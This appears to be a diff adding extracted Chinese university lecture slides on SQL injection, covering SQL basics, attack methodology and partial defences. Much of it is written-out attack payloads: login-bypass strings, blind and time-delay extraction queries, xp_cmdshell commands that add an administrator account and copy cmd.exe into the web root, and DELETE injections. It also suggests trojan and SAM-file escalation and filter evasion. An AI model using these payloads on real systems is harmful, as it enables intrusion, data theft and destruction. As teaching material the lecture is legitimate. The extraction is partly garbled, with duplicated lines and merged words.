@@ -1,0 +1,442 @@
+软件安全北京邮电大学计算机学院
+信息安全系
+张淼
+zhangmiao@bupt.edu.cn第四讲SQL注入1 SQL注入的概念与原理2 如何实现SQL注入3 几种攻击实例4 防范措施SQL在计算机技术高速发展的今天，越来越让人们头疼的是面临越来越“变态”
+和复杂的威胁网站技术，他们利用Internet 执行各种恶意活动，如身份窃取、
+私密信息窃取、带宽资源占用等。这些活动可能仅仅是出于好奇,而有的可能针
+对敏感信息,危害十分严重。
+网站威胁的目标定位有多个维度，是个人还是公司，还是某种行业，都有
+其考虑，甚至国家、地区、性别、种族、宗教等也成为发动攻击的原因或动机。
+攻击还会采用多种形态，甚至是复合形态，比如病毒、蠕虫、特洛伊、间谍软
+件、僵尸、网络钓鱼电子邮件、漏洞利用、下载程序、社会工程、rootkit、黑
+客，结果都可以导致用户信息受到危害，或者导致用户所需的服务被拒绝和劫
+持。
+在这种环境下,认识学习并学会预防各种WEB攻击方式是十分必要的。SQL??SQL = Structured Query Language  结构化查询语言
+?SQL语言使我们能够访问数据库
+?当前的主流SQL语言是SQL99
+?SQL能够:
+-执行对数据库的查询
+-获取数据库的信息
+-向数据库中插入新的记录
+-删除数据库中的记录
+-更新数据库中的记录SQL?SQL语言有很多不同的版本,他们对相同的关键字有相似的
+使用方式:
+例如: SELECT, UPDATE, DELETE, INSERT, WHERE
+但是,大多数SQL数据库程序都在SQL标准之上有自己独特
+的特性!SQL?一个相关数据库包含一个或多个由表名确定的表格.
+?例如,下面是一个名字为”user”的表格,它包含由行和列确定的
+数据:userIDNameLastNameLoginPassword1JohnSmithjsmithhello
+2AdamTayloradamtqwerty
+3DanielThompsondthompsondthompsonSQL?利用SQL,我们能够查询数据库并且获得一个返回的结果
+?对于一个存在的表格,我们可以这样进行查询:SELECT LastName
+FROM users 
+WHERE UserID= 1;
+SELECT LastName
+FROM users 
+WHERE UserID= 1;?
+返回如下结果:LastName
+--------------
+Smith
+LastName
+--------------
+SmithSQL Data Manipulation Language (DML)
+?SQL的更新,插入,删除记录语法:
+?SELECT –获取数据
+?UPDATA –更新数据
+?INSERT INTO –插入新数据
+?DELETE –删除数据SQL Data Definition Language (DDL)
+?SQL中的数据定义语言(DDL)允许我们:
+?创建或删除数据表格
+?定义索引
+?指定表格之间的关系
+?SQL中最常用的DDL语句有:
+?CREATE TABLE –创建一个新的数据表
+?ALTER TABLE –修改一个数据表
+?DROP TABLE –删除一个数据表SQL??SQL注入是一种利用用户输入构造SQL语句的攻击。
+?如果Web应用没有适当的验证用户输入的信息，攻击者就有
+可能改变后台执行的SQL语句的结构。由于程序运行SQL语句
+时的权限与当前该组建（例如，数据库服务器、Web应用服务
+器、Web服务器等）的权限相同，而这些组件一般的运行权限
+都很高，而且经常是以管理员的权限运行，所以攻击者获得数
+据库的完全控制，并可能执行系统命令。
+?在LDAP注入中同样的高级攻击方法在SQL注入中也适用。?SQL注入是现今存在最广泛的WEB漏洞之一
+?它是存在于WEB应用程序开发中的漏洞,而不是数据库的问题
+?大多数程序员对于SQL注入还是不够重视
+?现存许多的教程或者模板都存在漏洞
+?更糟糕的是,Internet上给出的许多解决方法并不能解决问题
+?据调查,超过60%的应用程序存在SQL注入漏洞安全边界已经扩展到了系统源代码FirewallHardened OS
+Web Server
+App ServerFirewallDatabases
+Legacy Systems
+Web Services
+Directories
+Human Resrcs
+BillingCustom Developed 
+Application Code
+APPLICATION
+ATTACKNetwork Layer
+Application LayerYour security “perimeter”has 
+huge holes at the application layer
+SSLIDS?几乎所有的SQL数据库以及语言都存在潜在的危险,包括:
+?MS SQL Server, Oracle, MySQL, Postgres, DB2, MS 
+Access, Sybase, Infomix ….
+?以下方式开发的应用程序存在风险:
+?Perl和CGI脚本且连接到数据库
+?ASP,JSP,PHP
+?XML,XSL和XSQL
+?Javascript
+?VB,MFC以及其他的基于ODBC的开发工具和API
+?……..2 SQL??最简单的登录查询:
+?ASP/MS SQL的语法如下:SELECT * FROM users 
+WHERE login = 'victor'
+AND password = '123'
+SELECT * FROM users 
+WHERE login = 'victor'
+AND password = '123'
+varsql= "SELECT * FROM users
+WHERE login = '" + formusr+ 
+"'AND password = '" + formpwd+ "'";
+varsql= "SELECT * FROM users
+WHERE login = '" + formusr+ 
+"'AND password = '" + formpwd+ "'";?我们使用这样的用户名和密码:
+?最后的语句就变为:formusr
+= 'or 1=1 ––
+formpwd= anything
+formusr= 'or 1=1 ––
+formpwd= anything
+SELECT * FROM users
+WHERE login = ' 'or 1=1
+––AND password = 'anything'
+SELECT * FROM users
+WHERE login = ' 'or 1=1
+––AND password = 'anything'我们应该特注意字符串中的‘字符
+?它充当了查询参数的右闭合符号
+?在它之后的任何语句都被认为是SQL命令的一部分
+?查询域不一定是字符串,也可能是日期,数字等等?
+PHP/MySQLSELECT * FROM clients 
+WHERE account = 12345678
+AND pin = 1111
+SELECT * FROM clients 
+WHERE account = 12345678
+AND pin = 1111
+$sql= "SELECT * FROM clients WHERE " . 
+"account = $formacctAND " . 
+"pin = $formpin"; 
+$sql= "SELECT * FROM clients WHERE " . 
+"account = $formacctAND " . 
+"pin = $formpin"; :$formacct= 1 or 1=1 # 
+$formpin= 1111
+$formacct= 1 or 1=1 # 
+$formpin= 1111
+SELECT * FROM clients
+WHERE account = 1 or 1=1
+#AND pin = 1111
+SELECT * FROM clients
+WHERE account = 1 or 1=1
+#AND pin = 1111SQL‘or“字符串指示符
+--or #单行注释
+/*…*/多行注释
++加号,连接符,或url中的空格
+||(双竖线)连接符
+%属性通配符
+?Param1=foo&Param2=barURL参数
+PRINT不执行的指令
+@variable本地变量
+@@variable全局变量
+waitfordelay ‘0:0:10’延时SQL这是一个网络应用中常见的提交用户信息以查询资料的窗口
+在窗口中提交姓名就构成了下列查询语句SELECT * FROM user_dataWHERE last_name= 'Your Name' 
+SELECT * FROM user_dataWHERE last_name= 'Your Name' SQL如果提交信息没有经过特殊字符的过滤,我们可以输入' OR '1=1 
+SELECT * FROM user_dataWHERE last_name= 'Your Name' 
+SELECT * FROM user_dataWHERE last_name= 'Your Name' 
+SELECT * FROM user_dataWHERE last_name= ' ' OR ' 1=1' 
+SELECT * FROM user_dataWHERE last_name= ' ' OR ' 1=1' 
+注意引号，语句结
+果无论如何都为真SQL这句查询语句的结果是:SQL1)
+2)
+6)攻击WEB系统7)3)
+判断数据库类型
+5)获取WEB虚拟目录
+4)判断用户权限?1) 2) 信息收集3)判断数据库类型5) OS Interaction 
+6) OS Cmd Prompt
+4)判断用户权限
+7) Expand Influence
+1)?据统计，网站用ASP+Access或SQLServer的占70%以上，PHP+MySQ占
+L20%，其他的不足10%。在本文，以SQL-SERVER＋ASP例说明SQL注入的原理、
+方法与过程,一般来说，
+SQL注入一般存在于形如
+等带有参数的ASP动态网页中，有时一个动态网页中可能只有一个参
+数，有时可能有N个参数，有时是整型参数，有时是字符串型参数，不能一
+概而论。总之只要是带有参数的动态网页且此网页访问了数据库，那么就
+有可能存在SQL注入。如果ASP程序员没有安全意识，不进行必要的字符过
+滤，存在SQL注入的可能性就非常大。HTTP://xxx.xxx.xxx/abc.asp?id=XX
+HTTP://xxx.xxx.xxx/abc.asp?id=XX漏洞可以存在于任何地方, 检查所有可以输入提交的地方:
+?Web页面上
+?URL请求中的脚本参数
+?在隐藏区域以及cookie中存储的值
+我们尝试插入各种字符:
+?字符序列' " ) # || + >
+?SQL的保留字以及分隔符
+%09select(tab%09, carriage return%13, linefeed%10and 
+space%32with  
+and, or, update, insert, exec, etc)
+?延时请求' waitfordelay '0:0:10'--SQL下面我们以HTTP://xxx.xxx.xxx/abc.asp?id=XX为例介绍如何判断
+是否存在SQL注入漏洞
+以整形参数为例,通常abc.asp中SQL语句原貌大致如下：
+select * from 表名where 字段=YY
+可以用以下经典的1=1,1=2测试法测试SQL注入是否存在。SQL如果以上三步全面满足，abc.asp中一定存在SQL注入漏洞。
+HTTP://xxx.xxx.xxx/abc.asp?p=YYand 1=2
+SQL语句: select * from 表名where 字段=YY and 1=2
+HTTP://xxx.xxx.xxx/abc.asp?p=YYand 1=2
+SQL语句: select * from 表名where 字段=YY and 1=2
+HTTP://xxx.xxx.xxx/abc.asp?p=YY’
+SQL语句: select * from 表名where 字段=YY’
+HTTP://xxx.xxx.xxx/abc.asp?p=YY’
+SQL语句: select * from 表名where 字段=YY’
+HTTP://xxx.xxx.xxx/abc.asp?p=YYand 1=1
+SQL语句: select * from 表名where 字段=YY and 1=1
+HTTP://xxx.xxx.xxx/abc.asp?p=YYand 1=1
+SQL语句: select * from 表名where 字段=YY and 1=1
+运行异常
+运行正常
+运行异常有时ASP程序员会在程序员过滤掉单引号等字符，以防止SQL注入。此时可
+以用以下几种方法试一试
+1.  由于VBS并不区分大小写，而程序员在过滤时通常要么全部
+过滤大写字符串，要么全部过滤小写字符串，而大小写混合往往会被忽视。
+如用SelecT代替select,SELECT等；
+2.UNICODE在IIS中，以UNICODE字符集实现国际化，我们完全可以IE
+中输入的字符串化成UNICODE字符串进行输入。如+ =%2B，空格=%20 
+等；
+3.ASCII可以把输入的部分或全部字符全部用ASCII码代替，如
+U=chr(85),a=chr(97)等2) 2)
+3)
+5) OS Interaction 
+6) OS Cmd Prompt
+4)
+7) Expand Influence
+1)发现漏洞
+?2) 我们按照下面的步骤收集信息a)判断数据库类型
+b)判断用户权限c)
+确定XP_CMDSHELL可执行情况a)一般来说，Access与SQL-Server是最常用的数据库服务器，尽管它们都支持T
+－SQL标准，但还有不同之处，而且不同的数据库有不同的攻击方法，必须要区
+别对待。
+1、利用数据库服务器的系统变量进行区分
+SQL-Server有user,db_name()等系统变量，利用这些系统值不仅可以判断SQL-
+Server ，而且还可以得到大量有用信息。如：
+HTTP://xxx.xxx.xxx/abc.asp?p=YY and user>0 
+不仅可以判断是否是SQL-Server ，而还可以得到当前连接到数据库的用户名
+HTTP://xxx.xxx.xxx/abc.asp?p=YY and db_name()>0 
+不仅可以判断是否是SQL-Server ，而还可以得到当前正在使用的数据库名；a)2、利用系统表
+Access的系统表是msysobjects,且在WEB环境下没有访问权限，而SQL-Server的
+系统表是sysobjects,在WEB环境下有访问权限。对于以下两条语句：
+HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(*) from sysobjects)>0
+HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(*) from msysobjects)>0
+若数据库是SQL-Server，则第一条，abc.asp一定运行正常，第二条则异常；若是
+Access则两条都会异常。a)3、利用MSSQL三个关键系统表
+sysdatabases：
+Microsoft SQL-Server 上的每个数据库在表中占一行。sysdatabases包含master
+、model、msdb、mssqlweb和tempdb数据库的项。
+sysobjects：
+SQL-Server 的每个数据库内都有此系统表，它存放该数据库内创建的所有对象，
+如约束、默认值、日志、规则、存储过程等，每个对象在表中占一行。
+syscolumns：
+该表位于每个数据库中。主要字段有：name ，id，colid：分别是字段名称，表ID
+号，字段ID号b)有许多适用于大多数SQL标准系统的命令可以获得关于用户权限的信息
+useror current_user
+session_user
+system_user
+' and 1 in(selectuser ) –
+'; ifuser ='dbo' waitfordelay'0:0:5 '—
+' union select if( user() like 'root@%', benchmark(50000,sha1('test')), 'false' );b)系统默认的权限有:
+sa, system, sys , dba, admin, root …..c)XP_CMDSHELL若当前连接数据的帐号具有SA权限，且master.dbo.xp_cmdshell扩展存储过程
+(调用此存储过程可以直接使用操作系统的shell)能够正确执行，则整个计算机可
+以通过以下方法完全控制:
+(master是SQL-SERVER的主数据库；名中的分号表示SQL-SERVER执行完分号前
+的语句名，继续执行其后面的语句；“—”号是注解，表示其后面的所有内容仅为
+注释，系统并不执行)   可以直接增加操作系统帐户aaa,密码为bbb。
+HTTP://xxx.xxx.xxx/abc.asp?p=YY；
+exec master.dbo.xp_cmdshell“net user aaabbb/add”–
+HTTP://xxx.xxx.xxx/abc.asp?p=YY；
+exec master.dbo.xp_cmdshell“net user aaabbb/add”–c)XP_CMDSHELL把刚刚增加的帐户aaa加到administrators组中。
+拷贝了一个cmd.exe,制造了UNICODE漏洞，通过此漏洞的利用方法，便完成了对
+整个计算机的控制
+HTTP://xxx.xxx.xxx/abc.asp?p=YY；exec 
+master.dbo.xp_cmdshell“net localgroup administrators aaa /add”
+HTTP://xxx.xxx.xxx/abc.asp?p=YY；exec 
+master.dbo.xp_cmdshell“net localgroup administrators aaa /add”
+HTTP://xxx.xxx.xxx/abc.asp?p=YY;execmaster.dbo.xp_cmdshell
+“copy c:\winnt\system32\cmd.exe c:\inetpub\scripts\cmd.exe”
+HTTP://xxx.xxx.xxx/abc.asp?p=YY;execmaster.dbo.xp_cmdshell
+“copy c:\winnt\system32\cmd.exe c:\inetpub\scripts\cmd.exe”2) WEB2)信息收集3)判断数据库类型5) WEB
+6) OS Cmd Prompt
+4)判断用户权限
+7) Expand Influence?1)发现漏洞5)WEB根据经验猜解
+WEB虚拟目录一般是:    c:\inetpub\wwwroot; 
+d:\inetpub\wwwroot; 
+e:\inetpub\wwwroot
+可执行虚拟目录一般是：c:\inetpub\scripts;
+d:\inetpub\scripts; 
+e:\inetpub\scripts5)WEB遍历系统的目录结构
+先创建一个临时表temp
+HTTP://xxx.xxx.xxx/abc.asp?p=YY;createtemp(idnvarchar(255),num1   
+nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--
+HTTP://xxx.xxx.xxx/abc.asp?p=YY;createtemp(idnvarchar(255),num1   
+nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--5)WEB1.利用xp_availablemedia来获得当前所有驱动器,并存入temp表中：
+2.利用xp_subdirs获得子目录列表,并存入temp表中：
+3.利用xp_dirtree获得所有子目录的目录树结构,并存入temp表中：
+至此,我们已经得到了WEB虚拟目录的所有信息,接下来浏览TEMP表即可
+HTTP://xxx.xxx.xxx/abc.asp?p=YY;
+insert into temp(id,num1)exec master.dbo.xp_availablemedia;--
+HTTP://xxx.xxx.xxx/abc.asp?p=YY;
+insert into temp(id,num1)exec master.dbo.xp_availablemedia;--
+HTTP://xxx.xxx.xxx/abc.asp?p=YY;
+insert into temp(id,num1)exec master.dbo.xp_subdirs'c:\';--
+HTTP://xxx.xxx.xxx/abc.asp?p=YY;
+insert into temp(id,num1)exec master.dbo.xp_subdirs'c:\';--
+HTTP://xxx.xxx.xxx/abc.asp?p=YY;
+insert into temp(id,num1) exec master.dbo.xp_dirtree'c:\';--
+HTTP://xxx.xxx.xxx/abc.asp?p=YY;
+insert into temp(id,num1) exec master.dbo.xp_dirtree'c:\';--6) WEB2)信息收集3)判断数据库类型
+6) WEB
+4)判断用户权限
+7) Expand Influence?1)发现漏洞5) OS Interaction 6)WEB利用WEB的远程管理功能
+许多WEB站点，为了维护的方便，都提供了远程管理的功能；也有不少WEB
+站点，其内容是对于不同的用户有不同的访问权限。为了达到对用户权限的
+控制，都有一个网页，要求用户名与密码，只有输入了正确的值，才能进行
+下一步的操作,可以实现对WEB的管理，如上传、下载文件，目录浏览、修
+改配置等。
+因此，若获取正确的用户名与密码，不仅可以上传ASP木马，有时甚至能够直
+接得到USER权限而浏览系统，上一步的“发现WEB虚拟目录”的复杂操作都
+可省略。
+用户名及密码一般存放在一张表中，发现这张表并读取其中内容便解决了问题。
+以下给出两种有效方法。6)WEB1.注入法：认证网页中通常使用如下的语句
+select * from admin where username='XXX' and password='YYY' 
+select * from admin where username='XXX' and password='YYY' 
+若在正式运行此句之前，没有进行必要的字符过滤，则很容易实施SQL注入
+如在用户名文本框内输入：abc’or 1=1在密码框内输入：123 则SQL语句变成：
+select * from admin where username='abc’or 1=1and password='123’
+select * from admin where username='abc’or 1=1and password='123’
+不管用户输入任何用户名与密码，此语句永远都能正确执行，用户轻易骗过系
+统，获取合法身份目标是以管理员Neville Bartholomew的身份登录,利用SQL注入跳过身份验证尝试在表格中输入‘OR ’1=1,发现有长度限制,所以用WebScarab截取提交信息,
+这样就跳过了密码长度限制,将提交的password修改为‘OR ’1=1,即可跳过验证6)WEB2.猜解法：猜解所有数据库名称，猜出库中的每张表名，分析可能是存放用户名与
+密码的表名，猜出表中的每个字段名，猜出表中的每条记录内容。
+通常根据个人经验猜解表名用户名字段以及密码字段，常用的名字有：
+常用表名：
+useruser, users, member, members, userlist, memberlist, userinfo,
+manager,admin,adminuser, systemuser, systemusers, sysuser, sysusers,
+sysaccounts,systemaccounts
+通过以下语句进行判断
+若表名存在，则abc.asp工作正常，否则异常。如此循环，直到猜到系统帐号表的名
+称。HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(*) from TestDB.dbo.
+表名)>0
+HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(*) from TestDB.dbo.表名)>06)WEB常用用户名字段：username,name,user,account
+常用密码字段：password,pass,pwd,passwd
+通过以下语句进行判断
+语句得到表的行数，所以若字段名存在，则abc.asp工作正常，否则异常。如此循
+环，直到猜到两个字段的名称。
+HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(字段名) from
+TestDB.dbo.admin)>0 “select count(字段名) from 表名”
+HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(字段名) from
+TestDB.dbo.admin)>0 “select count(字段名) from 表名”猜用户名与密码的内容最常用也是最有效的方法就是ASCII码逐字解码法，虽然这
+种方法速度较慢，但肯定是可行的，并且可以借助自动化工具实现。基本的思路
+是先猜出字段的长度，然后依次猜出每一位的值。猜用户名与猜密码的方法相
+同，以下以猜用户名为例说明其过程。
+这是一个存在SQL注入漏洞的页面，假设我们已经猜解出表名为user_data，用户字
+段名为userid现在目标是猜解userid=15613 的用户名first_name
+根据ASCII码逐字解码法，先将first_name的第一个字符的ascii码与M(77)比较101 AND (asc( mid((SELECTfirst_name
+FROM user_dataWHERE userid=15613) , 1 , 1) ) < 77 ); 
+101 AND (asc( mid((SELECTfirst_name
+FROM user_dataWHERE userid=15613) , 1 , 1) ) < 77 ); 如果返回为
+valid,那么第一个字符大于M,如果返回为invalid,那么就是小于M. 以下为攻击过程: 101 AND (asc( mid((SELECTfirst_name
+FROM user_dataWHERE userid=15613) , 1 , 1) ) < 77 );  
+101 AND (asc( mid((SELECTfirst_name
+FROM user_dataWHERE userid=15613) , 1 , 1) ) < 77 );  返回
+valid比M小101 AND (asc( mid((SELECTfirst_name
+FROM user_dataWHERE userid=15613) , 1 , 1) ) < 71 ); 
+101 AND (asc( mid((SELECTfirst_name
+FROM user_dataWHERE userid=15613) , 1 , 1) ) < 71 ); 返回
+invalid不比G小101 AND (asc( mid((SELECTfirst_name
+FROM user_dataWHERE userid=15613) , 1 , 1) ) < 74 );
+101 AND (asc( mid((SELECTfirst_name
+FROM user_dataWHERE userid=15613) , 1 , 1) ) < 74 );返回
+invalid不比J小101 AND (asc( mid((SELECTfirst_name
+FROM user_dataWHERE userid=15613) , 1 , 1) ) < 75 ); 
+101 AND (asc( mid((SELECTfirst_name
+FROM user_dataWHERE userid=15613) , 1 , 1) ) < 75 ); 返回
+valid比K小
+我们现在已经可以判定,第一个字符为J,以此类推我们可以猜出所有的字符7)当我们做完了上述所有的工作,要想获取对系统的完全控制，还要有系统的管理员权
+限。怎么办？提升权限的方法有很多种：
+上传木马，修改开机自动运行的.ini文件，服务器一重启，便运行木马；
+复制CMD.exe到scripts，人为制造UNICODE漏洞；
+下载SAM文件，破解并获取OS的所有用户名密码；
+等等，视系统的具体情况而定，可以采取不同的方法。攻击实例-WebGoat数字型SQL注入字符串型SQL注入数据库后门etc…SQL:SQL注入类似于XSS攻击,也是从提交的内容入手,它的特点如下:
+?代码由用户的浏览器装入并执行,通常在地址栏或输入栏装入
+?一般来说,SQL注入存在于形如
+http://www.test.com/abc.asp?id=xx 等带有参数的动态网页中
+?代码为SQL查询判断修改等语句,如果成功可以直接获得或修改
+数据库信息
+?SQL注入漏洞发生于网页程序员安全意识不强没有对输入内容
+过滤字符串SQL注入错误发生在：输入程序的数据来自于不可信源。这些数据被用于动态构建SQL查询。实例实例1:下面的代码动态构建和执行一个SQL查询，查找与
+给定名称匹配的item。查询限定只有当当前用户名与item
+的所有者名称匹配时，才向当前用户显示item。...
+String userName= ctx.getAuthenticatedUserName();
+String itemName= request.getParameter("itemName");
+String query = "SELECT * FROM items WHERE owner = '"
++ userName+ "' AND itemname= '"
++ itemName+ "'";     
+ResultSetrs= stmt.execute(query);
+...实例实例1:下面的代码动态构建和执行一个SQL查询，查找与
+给定名称匹配的item。查询限定只有当当前用户名与item
+的所有者名称匹配时，才向当前用户显示item。...
+String userName= ctx.getAuthenticatedUserName();
+String itemName= request.getParameter("itemName");
+String query = "SELECT * FROM items WHERE owner = '"
++ userName+ "' AND itemname= '"
++ itemName+ "'";     
+ResultSetrs= stmt.execute(query);
+...实例代码中的查询原本希望执行如下语句：SELECT * FROM items     
+WHERE owner = <userName>
+AND itemname= <itemName>;
+因为查询语句是通过连接常量字符串和用户输入的字符串来动态构造
+，所以只有当itemName中不包含单引号字符时，查询才能正确执行。
+如果一个用户名为wiley的攻击者输入字符串“name' OR 'a'='a”作为
+itemName的值，那么查询会变成如下形式：
+SELECT * FROM items
+WHERE owner = 'wiley'
+AND itemname= 'name' OR 'a'='a';实例额外的条件OR 'a'='a'导致了子句的值总是为true，于是该
+查询语句从逻辑上来说等价于：SELECT * FROM items;简化后的查询语句使得攻击者可以绕过查询只返回当前用户
+所拥有的item的限制，现在的查询会返回items表中储存的所
+有数据，无论它们的拥有者是谁。实例实例2:本例传递不同的恶意值给示例1中构造和执行的查
+询语句，检查其产生的效果。如果用户名为wiley的攻击者
+输入字符串“name'; DELETE FROM items; --”itemName
+的值，那么查询语句会变成如下两个查询：SELECT * FROM items 
+WHERE owner = 'wiley'
+AND itemname= 'name';
+DELETE FROM items;
+这种攻击语句在Oracle和其他不支持批量处理分号隔开的SQL语句的数据库
+服务器上会导致错误，但在允许批量处理的数据库上，这种攻击使得攻击者可
+以针对数据库执行任意指令。实例注意在最后的连字符--，它使得大多数数据库服务器将语句的剩余部分
+当作是注释而不去执行。这样一来，就可以把修改后的查询语句中最
+后的那个单引号给注释掉。对于那些不允许以这种方式使用注释的数
+据库，使用与示例1中类似的方法，仍然可以有效地进行此攻击。如果
+攻击者输入字符串“name'; DELETE FROM items; SELECT * FROM 
+items WHERE 'a'='a”，将构造下面三个有效语句：
+SELECT * FROM items 
+WHERE owner = 'wiley'
+AND itemname= 'name';
+DELETE FROM items;
+SELECT * FROM items WHERE 'a'='a';解决方案：一个传统的防止SQL注入攻击的方法是针对输入进行验
+证，或只接受白名单中的安全字符，或鉴别和排除黑名单
+中的恶意字符。白名单是一种非常有效的方法，虽然它需要执行严格的输
+入验证规则，但可以减少对参数化SQL语句的维护，并能
+够提供更高的安全保证。在大多数情况下，黑名单是充满
+漏洞的，并不能有效地预防SQL注入攻击。
+举个例子，攻击者可以：
+1）把没有被黑名单引用的对象作为目标；
+2）找到方法绕过需要排除的特殊字符；
+3）利用存储程序存储过程隐藏注入的特殊字符；手动排除输入到
+SQL查询中的字符是有用的，但它并不能
+保证你的应用程序不受SQL注入攻击。解决方案：另一个被提出的对付SQL注入攻击的常见
+方法是使用存储程序过程。存储程序过程通常通过限制作为参数的语
+句的类型来防止SQL注入攻击。但也有很多方法可以绕过该限制。存储程
+序过程能够防止一些攻击，但它并不能保
+证应用程序不受SQL注入攻击。
